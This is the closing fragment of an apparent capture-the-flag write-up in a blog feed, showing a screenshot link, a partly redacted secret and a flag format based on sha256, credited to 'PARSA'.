<p>awesome :D</p>

<p>do what it said :<br/>
<img src="http://up.ashiyane.org/images/lqo0cppgkh89dci505u1.png" alt="enter image description here" /></p>

<p>and its the first part of the flag :</p>

<blockquote><p>(#&lsquo;noname.people.admin/secret)
&ldquo;Ma secret is: [redacted]&rdquo;</p>

<p>Flag Format = sha256(secret+flag)
sha256(1_4m_50..[FILTERED]..1k3_60l4n6_700)
<strong>[redacted]</strong></p></blockquote>

<p>200 points ;)</p>

<p>WriteUp By PARSA</p>
]]></content>
  </entry>
  
</feed>
